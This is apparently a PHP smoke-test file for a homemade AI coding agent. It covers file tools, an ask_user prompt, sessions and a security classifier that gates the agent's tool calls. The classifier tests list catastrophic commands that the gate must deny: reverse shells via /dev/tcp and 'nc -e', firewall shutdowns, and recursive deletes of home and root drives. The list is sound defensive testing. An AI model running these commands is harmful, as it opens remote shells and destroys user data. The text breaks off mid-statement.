<?php
declare(strict_types=1);

$autoload = dirname(__DIR__) . '/vendor/autoload.php';
if (!is_file($autoload)) {
    fwrite(STDERR, "Dependencies are not installed. Run: composer install\n");
    exit(1);
}
require_once $autoload;

use MyAgent\Agent;
use MyAgent\Ansi;
use MyAgent\AnthropicClient;
use MyAgent\AskUser;
use MyAgent\LocalTools;
use MyAgent\McpClient;
use MyAgent\ModelCatalog;
use MyAgent\SecurityClassifier;
use MyAgent\Skills;
use MyAgent\SessionStore;
use MyAgent\Terminal;

function check(bool $condition, string $message): void {
    if (!$condition) { throw new RuntimeException($message); }
}

require __DIR__ . '/ui.php';

$root = dirname(__DIR__);
$skills = new Skills($root . '/tests/fixtures');
check(str_contains($skills->summary(), 'knowledge-graph-first'), 'Project skill not discovered');
check(str_contains($skills->read('knowledge-graph-first'), '# Knowledge-Graph-First'), 'Skill body not loaded');
$local = new LocalTools($root, $skills);
check(str_contains($local->call('list_files', ['path' => 'examples']), 'examples/echo-mcp.php'), 'File listing failed');
check(str_contains($local->call('read_file', ['path' => 'config.example.json']), 'mcpServers'), 'File read failed');
check(str_contains($local->call('run_command', ['command' => 'php -v']), 'PHP'), 'Command execution failed');
// Regression: a pager waiting for console input used to deadlock the pipe pump
// forever, so even the command timeout could not fire.
$started = microtime(true);
$paged = $local->call('run_command', [
    'command' => 'php -r "for($i=0;$i<200;$i++){echo str_repeat(\'x\',100),PHP_EOL;}" | more',
]);
check(str_contains($paged, 'xxx'), 'Paged command produced no output');
check(microtime(true) - $started < 30, 'Paged command took too long');
// Regression: the timeout must actually fire and return control.
$short = new LocalTools($root, $skills, 1);
$started = microtime(true);
$timedOut = '';
try {
    $short->call('run_command', ['command' => 'php -r "sleep(10);"']);
} catch (RuntimeException $e) {
    $timedOut = $e->getMessage();
}
check(str_contains($timedOut, 'timed out'), 'Command timeout not enforced');
check(microtime(true) - $started < 8, 'Command timeout took too long to fire');
$testFile = 'tests/.smoke-output.txt';
check(str_contains($local->call('write_file', ['path' => $testFile, 'content' => 'written']), 'Wrote'), 'File write failed');
check($local->call('read_file', ['path' => $testFile]) === 'written', 'File write content wrong');
unlink($root . '/' . $testFile);
try {
    $local->call('read_file', ['path' => '../outside.txt']);
    throw new RuntimeException('Path traversal allowed');
} catch (RuntimeException $e) {
    check($e->getMessage() !== 'Path traversal allowed', 'Path traversal allowed');
}

// --- ask_user tool -----------------------------------------------------------

/** @param list<string|null> $lines */
$scripted = static function (array $lines, ?string &$output = null): AskUser {
    $output = '';
    return new AskUser(
        static function () use (&$lines): ?string {
            return $lines === [] ? null : array_shift($lines);
        },
        static function (string $text) use (&$output): void {
            $output .= $text;
        },
    );
};

/** @param callable(): mixed $run */
function errorOf(callable $run): string
{
    try {
        $run();
    } catch (RuntimeException $e) {
        return $e->getMessage();
    }
    throw new RuntimeException('Expected a RuntimeException');
}

require __DIR__ . '/selector.php';
require __DIR__ . '/media.php';

$rendered = '';
$askLocal = new LocalTools($root, $skills, 300, $scripted(['2'], $rendered));
check($askLocal->canAskUser(), 'ask_user should be available with a reader');
$askCatalog = [];
foreach ($askLocal->definitions() as $definition) {
    $askCatalog[(string) $definition['name']] = $definition;
}
check(isset($askCatalog['ask_user']), 'ask_user definition missing');
$askSchema = $askCatalog['ask_user']['input_schema'] ?? [];
check(($askSchema['properties']['options']['maxItems'] ?? 0) === 4, 'ask_user option cap missing');
check(($askSchema['properties']['options']['minItems'] ?? 0) === 1, 'ask_user option minimum missing');
check(($askSchema['required'] ?? []) === ['question', 'options'], 'ask_user required fields missing');
check(
    $askLocal->call('ask_user', ['question' => 'Pick one', 'options' => ['staging', 'production']]) === 'The user answered: production',
    'ask_user option selection failed'
);
check(
    str_contains($rendered, '1) staging')
    && str_contains($rendered, '2) production')
    && str_contains($rendered, '3) Other - type your own answer'),
    'ask_user prompt rendering failed'
);

$otherLocal = new LocalTools($root, $skills, 300, $scripted(['3', 'blue']));
check(
    $otherLocal->call('ask_user', ['question' => 'Pick', 'options' => ['A', 'B']]) === 'The user answered: blue',
    'ask_user Other answer failed'
);
$freeLocal = new LocalTools($root, $skills, 300, $scripted(['sandbox']));
check(
    $freeLocal->call('ask_user', ['question' => 'Pick', 'options' => ['A', 'B']]) === 'The user answered: sandbox',
    'ask_user direct free text failed'
);
$retryLocal = new LocalTools($root, $skills, 300, $scripted(['0', '9', '1']));
check(
    $retryLocal->call('ask_user', ['question' => 'Pick', 'options' => ['staging', 'production']]) === 'The user answered: staging',
    'ask_user retry after invalid choices failed'
);
$normalizeLocal = new LocalTools($root, $skills, 300, $scripted(['1']));
check(
    $normalizeLocal->call('ask_user', ['question' => "  Which\n environment?  ", 'options' => ["  multi\nline  \tchoice "]]) === 'The user answered: multi line choice',
    'ask_user normalization failed'
);
$numericLocal = new LocalTools($root, $skills, 300, $scripted(['2']));
check(
    $numericLocal->call('ask_user', ['question' => 'Pick', 'options' => [1, 2]]) === 'The user answered: 2',
    'ask_user numeric options failed'
);

check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted(['1'])))->call('ask_user', ['question' => '   ', 'options' => ['A']])), 'non-empty question'),
    'ask_user accepted an empty question'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted(['1'])))->call('ask_user', ['question' => 'Pick', 'options' => []])), 'between 1 and 4'),
    'ask_user accepted zero options'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted(['1'])))->call('ask_user', ['question' => 'Pick', 'options' => ['1', '2', '3', '4', '5']])), 'between 1 and 4'),
    'ask_user accepted five options'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted(['1'])))->call('ask_user', ['question' => 'Pick', 'options' => ['']])), 'non-empty text'),
    'ask_user accepted an empty option'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted(['1'])))->call('ask_user', ['question' => 'Pick', 'options' => [['nested']]])), 'non-empty text'),
    'ask_user accepted a non-scalar option'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted(['1'])))->call('ask_user', ['question' => 'Pick', 'options' => 'A'])), 'options array'),
    'ask_user accepted a non-array options value'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted([''])))->call('ask_user', ['question' => 'Pick', 'options' => ['A']])), 'cancelled'),
    'ask_user did not treat an empty line as cancel'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted([])))->call('ask_user', ['question' => 'Pick', 'options' => ['A']])), 'cancelled'),
    'ask_user did not treat EOF as cancel'
);
check(
    str_contains(errorOf(static fn() => (new LocalTools($root, $skills, 300, $scripted(['0', '0', '0'])))->call('ask_user', ['question' => 'Pick', 'options' => ['A']])), 'No valid answer'),
    'ask_user accepted three invalid selections'
);

$offline = new AskUser();
check(!$offline->available(), 'AskUser without a reader should be unavailable');
check(
    str_contains(errorOf(static fn() => $offline->ask('Pick', ['A'])), 'unavailable'),
    'AskUser unavailable message missing'
);
$plain = new LocalTools($root, $skills);
check(!$plain->canAskUser(), 'ask_user should be unavailable without a reader');
foreach ($plain->definitions() as $definition) {
    check(($definition['name'] ?? '') !== 'ask_user', 'ask_user definition leaked without a terminal');
}
check(
    str_contains(errorOf(static fn() => $plain->call('ask_user', ['question' => 'Pick', 'options' => ['A']])), 'unavailable'),
    'Unavailable ask_user call did not error'
);

$askActor = new class('unused') extends AnthropicClient {
    public int $calls = 0;
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        check(str_contains($system, 'ask_user'), 'ask_user guidance missing from the system prompt');
        $this->calls++;
        if ($this->calls === 1) {
            return ['content' => [['type' => 'tool_use', 'id' => 'ask-tool', 'name' => 'ask_user', 'input' => ['question' => 'Pick', 'options' => ['A', 'B']]]], 'stop_reason' => 'tool_use'];
        }
        check(($messages[2]['content'][0]['content'] ?? '') === 'The user answered: B', 'ask_user answer was not returned to the model');
        return ['content' => [['type' => 'text', 'text' => 'done']], 'stop_reason' => 'end_turn'];
    }
};
(new Agent($askActor, new LocalTools($root, $skills, 300, $scripted(['2'])), [], 'test', 100, 2))->run('Ask me');
check($askActor->calls === 2, 'Agent did not continue after ask_user');

$client = new McpClient('example', ['command' => PHP_BINARY, 'args' => ['examples/echo-mcp.php']], $root);
fwrite(STDERR, "Connecting MCP test server...\n");
$client->connect();
fwrite(STDERR, "MCP connected.\n");
$defs = $client->definitions();
check(count($defs) === 2, 'MCP tool discovery failed');
$alias = array_key_first($defs);
check(str_contains($client->call($alias, ['text' => 'hello']), 'hello'), 'MCP tool call failed');
$noArg = $defs['mcp_example_ping']['input_schema'] ?? [];
check(($noArg['type'] ?? '') === 'object', 'MCP no-arg schema lost its object type');
check(str_contains((string) json_encode($noArg), '"properties":{}'), 'MCP no-arg schema must encode properties as a JSON object');
$client->close();

$fake = new class('unused') extends AnthropicClient {
    public int $calls = 0;
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        check(str_contains($system, 'knowledge-graph-first'), 'Skill catalog missing from prompt');
        check(count($tools) >= 5, 'Local tools missing');
        $this->calls++;
        if ($this->calls === 1) {
            return ['content' => [['type' => 'tool_use', 'id' => 'tool-1', 'name' => 'read_file', 'input' => ['path' => 'config.example.json']]], 'stop_reason' => 'tool_use'];
        }
        check(($messages[2]['content'][0]['tool_use_id'] ?? '') === 'tool-1', 'Tool result not returned to model');
        return ['content' => [['type' => 'text', 'text' => 'done']], 'stop_reason' => 'end_turn'];
    }
};
$agent = new Agent($fake, $local, [], 'test', 100, 3);
$agent->run('Read config');
check($fake->calls === 2, 'Agent did not continue after tool use');

// --- Tool result size limit --------------------------------------------------

check($agent->toolResultLimit() === 100000, 'Unexpected default tool result limit');
check(
    errorOf(static function () use ($local): void {
        (new Agent(new class('unused') extends AnthropicClient {}, $local, [], 'test', 100, 1))->setToolResultLimit(-1);
    }) !== '',
    'Negative tool result limit was accepted'
);
$bigFile = 'tests/.smoke-large-output.txt';
$bigContent = str_repeat("line of tool output\n", 2000);
file_put_contents($root . '/' . $bigFile, $bigContent);
try {
    $limited = new class('unused') extends AnthropicClient {
        public ?string $toolResult = null;
        public int $calls = 0;
        public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
            $this->calls++;
            if ($this->calls === 1) {
                return ['content' => [['type' => 'tool_use', 'id' => 'big-1', 'name' => 'read_file', 'input' => ['path' => 'tests/.smoke-large-output.txt']]], 'stop_reason' => 'tool_use'];
            }
            $this->toolResult = (string) ($messages[2]['content'][0]['content'] ?? '');
            return ['content' => [['type' => 'text', 'text' => 'done']], 'stop_reason' => 'end_turn'];
        }
    };
    $limitAgent = new Agent($limited, $local, [], 'test', 100, 2);
    $limitAgent->setToolResultLimit(1000);
    $limitAgent->run('Read the big file');
    $toolResult = (string) $limited->toolResult;
    check(str_contains($toolResult, '[myagent] Tool output truncated'), 'Oversized tool output was not flagged');
    check(str_starts_with($toolResult, substr($bigContent, 0, 1000)), 'Oversized tool output lost its prefix');
    check(strlen($toolResult) < strlen($bigContent), 'Oversized tool output was not shortened');
    check(preg_match('/Full output saved to: (.+)/', $toolResult, $match) === 1, 'Spill file path missing from the tool result');
    $spillPath = trim($match[1]);
    try {
        check(is_file($spillPath), 'The full tool output was not written to a temp file');
        check(file_get_contents($spillPath) === $bigContent, 'The spill file does not contain the full tool output');
        $tempRoot = realpath(sys_get_temp_dir());
        check(
            $tempRoot !== false && str_starts_with(strtolower((string) realpath(dirname($spillPath))), strtolower($tempRoot)),
            'The spill file is not in the system temp directory'
        );
    } finally {
        @unlink($spillPath);
    }

    $unlimited = new class('unused') extends AnthropicClient {
        public ?string $toolResult = null;
        public int $calls = 0;
        public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
            $this->calls++;
            if ($this->calls === 1) {
                return ['content' => [['type' => 'tool_use', 'id' => 'big-2', 'name' => 'read_file', 'input' => ['path' => 'tests/.smoke-large-output.txt']]], 'stop_reason' => 'tool_use'];
            }
            $this->toolResult = (string) ($messages[2]['content'][0]['content'] ?? '');
            return ['content' => [['type' => 'text', 'text' => 'done']], 'stop_reason' => 'end_turn'];
        }
    };
    $unlimitedAgent = new Agent($unlimited, $local, [], 'test', 100, 2);
    $unlimitedAgent->setToolResultLimit(0);
    $unlimitedAgent->run('Read the big file');
    check($unlimited->toolResult === $bigContent, 'A zero limit should leave tool output unchanged');
} finally {
    @unlink($root . '/' . $bigFile);
}

$sessionName = 'smoke-' . getmypid();
$store = new SessionStore($root, $sessionName);
$sessionFile = $root . '/.agent/sessions/' . $sessionName . '.json';
try {
    try {
        new SessionStore($root, $sessionName);
        throw new RuntimeException('Concurrent session was allowed');
    } catch (RuntimeException $e) {
        check($e->getMessage() !== 'Concurrent session was allowed', 'Concurrent session was allowed');
    }
    $first = new class('unused') extends AnthropicClient {
        public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
            return ['content' => [['type' => 'tool_use', 'id' => 'saved-tool', 'name' => 'read_file', 'input' => ['path' => 'config.example.json']]], 'stop_reason' => 'tool_use'];
        }
    };
    check((new Agent($first, $local, [], 'test', 100, 1, $store))->run('A long task') === false, 'Step limit did not report incomplete work');
    check($store->load()['in_progress'] === true, 'Unfinished task was not checkpointed');
    $second = new class('unused') extends AnthropicClient {
        public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
            check(($messages[2]['content'][0]['tool_use_id'] ?? '') === 'saved-tool', 'Tool result not restored');
            return ['content' => [['type' => 'text', 'text' => 'resumed']], 'stop_reason' => 'end_turn'];
        }
    };
    (new Agent($second, $local, [], 'test', 100, 2, $store))->resume();
    check($store->load()['in_progress'] === false, 'Completed task remains active');

    $store->save(['version' => 1, 'model' => 'test', 'in_progress' => true, 'pending_results' => [], 'messages' => [
        ['role' => 'user', 'content' => 'Write a file'],
        ['role' => 'assistant', 'content' => [['type' => 'tool_use', 'id' => 'uncertain', 'name' => 'write_file', 'input' => ['path' => 'tests/.must-not-run.txt', 'content' => 'bad']]]],
    ]]);
    $recovery = new class('unused') extends AnthropicClient {
        public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
            check(($messages[2]['content'][0]['is_error'] ?? false) === true, 'Interrupted tool was not marked uncertain');
            return ['content' => [['type' => 'text', 'text' => 'checked']], 'stop_reason' => 'end_turn'];
        }
    };
    (new Agent($recovery, $local, [], 'test', 100, 2, $store))->resume();
    check(!is_file($root . '/tests/.must-not-run.txt'), 'Interrupted tool was executed twice');

    $compacted = new class('unused') extends AnthropicClient {
        public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
            return ['content' => [['type' => 'compaction', 'content' => 'Summary', 'signature' => 'example'], ['type' => 'text', 'text' => 'complete']], 'stop_reason' => 'end_turn'];
        }
    };
    (new Agent($compacted, $local, [], 'test', 100, 2, $store))->run('Another task');
    $saved = $store->load();
    check(count($saved['messages']) === 1 && $saved['messages'][0]['content'][0]['type'] === 'compaction', 'Compacted history was not trimmed');
} finally {
    unset($store);
    @unlink($sessionFile);
    @unlink($root . '/.agent/sessions/' . $sessionName . '.lock');
}

// --- Always-on sessions ------------------------------------------------------
// Every run checkpoints, so an unnamed process needs a generated id, and
// --continue must be able to find the newest checkpoint.
$autoName = SessionStore::randomName();
check(preg_match('/^[a-zA-Z0-9_-]{1,64}$/', $autoName) === 1, 'Generated session name is not usable: ' . $autoName);
check(SessionStore::randomName() !== $autoName, 'Generated session names repeat');
$emptyState = ['version' => 1, 'model' => 'test', 'in_progress' => false, 'pending_results' => [], 'messages' => []];
$scratchRoot = $root . '/.agent/session-store-' . getmypid();
@mkdir($scratchRoot, 0700, true);
check(SessionStore::latest($scratchRoot) === null, 'An empty project reported a latest session');
$olderStore = new SessionStore($scratchRoot, 'older-session');
$olderStore->save($emptyState);
@touch($scratchRoot . '/.agent/sessions/older-session.json', time() - 120);
unset($olderStore);
$newerStore = new SessionStore($scratchRoot, $autoName);
$newerStore->save($emptyState);
check($newerStore->name() === $autoName, 'The session store forgot its own name');
check(SessionStore::latest($scratchRoot) === $autoName, 'The newest checkpoint was not reported as latest');
check(SessionStore::latest($root . '/.agent/no-such-project') === null, 'A missing session directory reported a latest session');
unset($newerStore);
foreach (glob($scratchRoot . '/.agent/sessions/*') ?: [] as $scratchFile) {
    @unlink($scratchFile);
}
@rmdir($scratchRoot . '/.agent/sessions');
@rmdir($scratchRoot . '/.agent');
@rmdir($scratchRoot);

// The CLI itself must open a session without being asked: every run checkpoints,
// an unnamed run gets a random id, and the id is reported to the caller.
$runCli = static function (string $workspace, string $arguments) use ($root): array {
    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $process = proc_open(
        [PHP_BINARY, '-d', 'opcache.enable_cli=0', $root . '/agent.php', ...explode(' ', $arguments)],
        $descriptors,
        $pipes,
        $workspace
    );
    if (!is_resource($process)) {
        throw new RuntimeException('Could not start agent.php');
    }
    fclose($pipes[0]);
    $stdout = (string) stream_get_contents($pipes[1]);
    $stderr = (string) stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    $code = proc_close($process);
    $events = [];
    foreach (preg_split('/\R/', trim($stdout)) ?: [] as $line) {
        $event = json_decode($line, true);
        if (is_array($event)) {
            $events[] = $event;
        }
    }
    return ['code' => $code, 'events' => $events, 'stderr' => $stderr];
};
$cliRoot = sys_get_temp_dir() . '/myagent-session-cli-' . getmypid() . '-' . bin2hex(random_bytes(2));
mkdir($cliRoot, 0700, true);
$cliConfig = $root . '/tests/fixtures/session-config.json';
// Headless (no bridge, no prompt): the run still opens a session and prints it.
$headless = $runCli($cliRoot, '--config=' . $cliConfig);
check($headless['code'] === 0, 'A headless run failed: ' . trim($headless['stderr']));
check(preg_match('/session +([a-zA-Z0-9_-]+) \(new\)/', $headless['stderr'], $headlessName) === 1,
    'A headless run did not print its session name: ' . trim($headless['stderr']));
check(is_dir($cliRoot . '/.agent/sessions'), 'The CLI did not create the session directory');
// Bridge mode reports the same fact on the event stream.
$firstRun = $runCli($cliRoot, '--bridge --config=' . $cliConfig);
$firstReady = $firstRun['events'][0] ?? [];
check($firstRun['code'] === 0, 'A piped bridge run failed: ' . trim($firstRun['stderr']));
check(($firstReady['type'] ?? '') === 'ready', 'The first bridge event was not ready');
check(is_string($firstReady['session'] ?? null) && $firstReady['session'] !== '',
    'An unnamed run did not open a session');
check(preg_match('/^[a-zA-Z0-9_-]{1,64}$/', (string) $firstReady['session']) === 1,
    'The generated session name is not usable: ' . (string) ($firstReady['session'] ?? ''));
check(($firstReady['session_new'] ?? null) === true, 'A generated session was not reported as new');
check(($firstReady['session'] ?? null) !== $headlessName[1], 'Two unnamed runs reused the same session name');
$namedRun = $runCli($cliRoot, '--bridge --session=cli-named --config=' . $cliConfig);
$namedReady = $namedRun['events'][0] ?? [];
check($namedRun['code'] === 0, 'A named piped bridge run failed: ' . trim($namedRun['stderr']));
check(($namedReady['session'] ?? null) === 'cli-named', '--session did not win over the generated name');
foreach (glob($cliRoot . '/.agent/sessions/*') ?: [] as $cliFile) {
    @unlink($cliFile);
}
@rmdir($cliRoot . '/.agent/sessions');
@rmdir($cliRoot . '/.agent');
@rmdir($cliRoot . '/.agent/media');
@rmdir($cliRoot . '/.agent/media/inbox');
@rmdir($cliRoot);

// --- Outgoing payload encoding -----------------------------------------------

$encoder = new class('unused') extends AnthropicClient {
    /** @param array<string, mixed> $body */
    public function encode(array $body): string {
        return $this->encodeRequestBody($body);
    }
};
$binary = "bin\xFF\xFE\x00data";
$encodedPayload = $encoder->encode(['messages' => [['role' => 'user', 'content' => $binary]]]);
check(trim($encodedPayload) !== '', 'Binary tool output produced an empty request body');
check(is_array(json_decode($encodedPayload, true)), 'Binary tool output produced invalid request JSON');
$encodingError = errorOf(static fn(): string => $encoder->encode(['value' => NAN]));
check(
    str_contains($encodingError, 'Could not encode the API request as JSON'),
    'An unencodable payload was not reported as an encoding error'
);

$binarySessionName = 'smoke-binary-' . getmypid();
$binaryStore = new SessionStore($root, $binarySessionName);
try {
    $binaryStore->save(['version' => 1, 'model' => 'test', 'in_progress' => false, 'pending_results' => [], 'messages' => [
        ['role' => 'user', 'content' => $binary],
    ]]);
    check(is_string($binaryStore->load()['messages'][0]['content']), 'Binary session checkpoint was not readable');
} finally {
    unset($binaryStore);
    @unlink($root . '/.agent/sessions/' . $binarySessionName . '.json');
    @unlink($root . '/.agent/sessions/' . $binarySessionName . '.lock');
}

// --- Security reviewer -------------------------------------------------------

$catalog = [];
foreach ($local->definitions() as $definition) {
    $catalog[(string) $definition['name']] = $definition;
}
$allowJson = '{"verdict":"allow","risk":"low","category":"write","reason":"Local project file.","user_message":""}';
$denyJson = '{"verdict":"deny","risk":"high","category":"destructive","reason":"Would delete project data.","user_message":"Blocked."}';
$askJson = '{"verdict":"ask","risk":"high","category":"shared-state","reason":"Pushes to a shared branch.","user_message":"Confirm the push."}';

// Deterministic catastrophe check: no reviewer call.
$never = new class('unused') extends AnthropicClient {
    public int $calls = 0;
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        $this->calls++;
        return ['content' => [['type' => 'text', 'text' => '{"verdict":"allow","risk":"low","category":"other","reason":"ok","user_message":""}']], 'stop_reason' => 'end_turn'];
    }
};
$gate = new SecurityClassifier($never, 'reviewer', $root, ['audit_log' => '']);
$static = $gate->review(['type' => 'tool_use', 'id' => 'static', 'name' => 'run_command', 'input' => ['command' => 'rm -rf /']], [], $catalog);
check($static['verdict'] === 'deny' && $static['source'] === 'static', 'Catastrophic command was not blocked');

// HARD BLOCK patterns extracted from Claude Code's security classifier.
$catastrophic = [
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'nc -e /bin/sh 10.0.0.1 4444',
    'netsh advfirewall set allprofiles state off',
    'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False',
    'Remove-Item -Recurse -Force C:\\',
    'Remove-Item C:\\ -Recurse -Force',
    'Remove-Item -Recurse -Force $HOME',
    'cipher /w:C:',
    'rm -rf $HOME/*',
    'rm -rf /home',
];
foreach ($catastrophic as $command) {
    $decision = $gate->review(
        ['type' => 'tool_use', 'id' => 'static', 'name' => 'run_command', 'input' => ['command' => $command]],
        [],
        $catalog
    );
    check($decision['verdict'] === 'deny' && $decision['source'] === 'static', 'Catastrophic command was not blocked: ' . $command);
}
check($never->calls === 0, 'Static check did not short-circuit the reviewer');

// A bounded delete is a SOFT BLOCK, not a deterministic HARD BLOCK.
$bounded = $gate->review(
    ['type' => 'tool_use', 'id' => 'bounded', 'name' => 'run_command', 'input' => ['command' => 'rm -rf build']],
    [],
    $catalog
);
check($bounded['verdict'] === 'allow' && $bounded['source'] === 'reviewer', 'Bounded rm -rf was statically blocked');
check($never->calls === 1, 'Bounded rm -rf did not reach the reviewer');
$never->calls = 0;

$read = $gate->review(['type' => 'tool_use', 'id' => 'read', 'name' => 'read_file', 'input' => ['path' => 'README.md']], [], $catalog);
check($read['verdict'] === 'allow' && $read['source'] === 'auto-allow', 'Read-only tool was not auto-allowed');
check($never->calls === 0, 'Auto-allowed tool reached the reviewer');

// ask_user is a side-effect-free interaction: allowed even under review_all.
$askReviewer = new class('unused') extends AnthropicClient {
    public int $calls = 0;
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        $this->calls++;
        throw new RuntimeException('ask_user must not reach the reviewer');
    }
};
$askGate = new SecurityClassifier($askReviewer, 'reviewer', $root, ['audit_log' => '', 'review_all' => true]);
$askDecision = $askGate->review(
    ['type' => 'tool_use', 'id' => 'ask-security', 'name' => 'ask_user', 'input' => ['question' => 'Pick', 'options' => ['A']]],
    [],
    $catalog
);
check($askDecision['verdict'] === 'allow' && $askDecision['source'] === 'auto-allow', 'ask_user was not auto-allowed');
check($askReviewer->calls === 0, 'ask_user reached the reviewer');

/** @param string $json Reviewer reply text. */
$reviewer = static fn(string $json): AnthropicClient => new class($json) extends AnthropicClient {
    public function __construct(private string $json) {
    }
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        return ['content' => [['type' => 'text', 'text' => $this->json]], 'stop_reason' => 'end_turn'];
    }
};

// Reviewer deny blocks execution and returns an error tool_result to the actor.
$blockedFile = 'tests/.security-blocked.txt';
$blocker = new SecurityClassifier($reviewer($denyJson), 'reviewer', $root, ['audit_log' => '']);
$actorDenied = new class('unused') extends AnthropicClient {
    public int $calls = 0;
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        $this->calls++;
        if ($this->calls === 1) {
            return ['content' => [['type' => 'tool_use', 'id' => 'blocked-tool', 'name' => 'write_file', 'input' => ['path' => 'tests/.security-blocked.txt', 'content' => 'x']]], 'stop_reason' => 'tool_use'];
        }
        check(($messages[2]['content'][0]['is_error'] ?? false) === true, 'Blocked tool result was not an error');
        check(str_contains((string) ($messages[2]['content'][0]['content'] ?? ''), 'Security reviewer blocked'), 'Block reason missing');
        return ['content' => [['type' => 'text', 'text' => 'stopped']], 'stop_reason' => 'end_turn'];
    }
};
(new Agent($actorDenied, $local, [], 'test', 100, 2, null, 24000, 2048, $blocker))->run('Write a file');
check(!is_file($root . '/' . $blockedFile), 'Denied tool was executed');

// Reviewer allow lets the call run.
$allowedFile = 'tests/.security-allowed.txt';
$allower = new SecurityClassifier($reviewer($allowJson), 'reviewer', $root, ['audit_log' => '']);
$actorAllowed = new class('unused') extends AnthropicClient {
    public int $calls = 0;
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        $this->calls++;
        if ($this->calls === 1) {
            return ['content' => [['type' => 'tool_use', 'id' => 'allowed-tool', 'name' => 'write_file', 'input' => ['path' => 'tests/.security-allowed.txt', 'content' => 'ok']]], 'stop_reason' => 'tool_use'];
        }
        return ['content' => [['type' => 'text', 'text' => 'done']], 'stop_reason' => 'end_turn'];
    }
};
(new Agent($actorAllowed, $local, [], 'test', 100, 2, null, 24000, 2048, $allower))->run('Write a file');
check(is_file($root . '/' . $allowedFile), 'Allowed tool was not executed');
@unlink($root . '/' . $allowedFile);

// Ask: denied without an approver, allowed when the user approves.
$askGate = new SecurityClassifier($reviewer($askJson), 'reviewer', $root, ['audit_log' => '']);
$askCall = ['type' => 'tool_use', 'id' => 'ask', 'name' => 'run_command', 'input' => ['command' => 'git push origin main']];
$asked = $askGate->review($askCall, [], $catalog);
check($asked['verdict'] === 'deny' && $asked['source'] === 'ask-unavailable', 'Ask without an approver was not denied');
$approving = new SecurityClassifier($reviewer($askJson), 'reviewer', $root, ['audit_log' => ''],
    static fn(array $call, array $decision): bool => true);
$approvedAsk = $approving->review($askCall, [], $catalog);
check($approvedAsk['verdict'] === 'allow' && $approvedAsk['approved_by_user'] === true, 'Approved ask did not run');
$declining = new SecurityClassifier($reviewer($askJson), 'reviewer', $root, ['audit_log' => ''],
    static fn(array $call, array $decision): bool => false);
check($declining->review($askCall, [], $catalog)['verdict'] === 'deny', 'Declined ask was not denied');

// Unusable reviewer output and reviewer failures fail closed.
$invalid = new SecurityClassifier($reviewer('I think it is fine.'), 'reviewer', $root, ['audit_log' => '']);
$invalidDecision = $invalid->review(['type' => 'tool_use', 'id' => 'x', 'name' => 'write_file', 'input' => ['path' => 'tests/x.txt', 'content' => 'x']], [], $catalog);
check($invalidDecision['verdict'] === 'deny' && $invalidDecision['source'] === 'invalid-output', 'Unusable verdict was not denied');

$broken = new class('unused') extends AnthropicClient {
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        throw new RuntimeException('reviewer offline');
    }
};
$closed = new SecurityClassifier($broken, 'reviewer', $root, ['audit_log' => '']);
$closedDecision = $closed->review(['type' => 'tool_use', 'id' => 'x', 'name' => 'write_file', 'input' => ['path' => 'tests/x.txt', 'content' => 'x']], [], $catalog);
check($closedDecision['verdict'] === 'deny' && str_contains($closedDecision['reason'], 'reviewer offline'), 'Reviewer failure did not fail closed');
$open = new SecurityClassifier($broken, 'reviewer', $root, ['audit_log' => '', 'fail_closed' => false]);
check($open->review(['type' => 'tool_use', 'id' => 'x', 'name' => 'write_file', 'input' => ['path' => 'tests/x.txt', 'content' => 'x']], [], $catalog)['verdict'] === 'allow', 'fail_closed=false did not allow on reviewer failure');

// A critical-risk "allow" is contradictory and is enforced as a deny.
$contradiction = new SecurityClassifier(
    $reviewer('{"verdict":"allow","risk":"critical","category":"destructive","reason":"x","user_message":""}'),
    'reviewer', $root, ['audit_log' => '']
);
$contradictionDecision = $contradiction->review(['type' => 'tool_use', 'id' => 'x', 'name' => 'write_file', 'input' => ['path' => 'tests/x.txt', 'content' => 'x']], [], $catalog);
check($contradictionDecision['verdict'] === 'deny', 'Critical-risk allow was not converted to deny');

// --- Terminal UI integration -------------------------------------------------

$uiOut = '';
$uiErr = '';
$ui = new Terminal(true, true, [
    'color' => 'always',
    'unicode' => 'always',
    'width' => 72,
    'usage' => false,
    'spinner' => true,
], static function (string $text) use (&$uiOut): void { $uiOut .= $text; }, static function (string $text) use (&$uiErr): void { $uiErr .= $text; });

$uiActor = new class('unused') extends AnthropicClient {
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        return [
            'content' => [['type' => 'text', 'text' => "# Done\n\n**ok**"]],
            'stop_reason' => 'end_turn',
            'usage' => ['input_tokens' => 10, 'output_tokens' => 2],
        ];
    }
};
(new Agent($uiActor, $local, [], 'test', 100, 2, null, 24000, 2048, null, $ui))->run('Hi');
check(str_contains($uiOut, 'Done') && !str_contains($uiOut, '**'), 'assistant markdown not rendered');
check(str_contains($uiOut, "\033["), 'styled assistant output has no ANSI');
check(str_contains($uiErr, 'Thinking'), 'spinner did not run during the styled turn');

$plainOut = '';
$plainUi = new Terminal(false, false, [
    'color' => 'never',
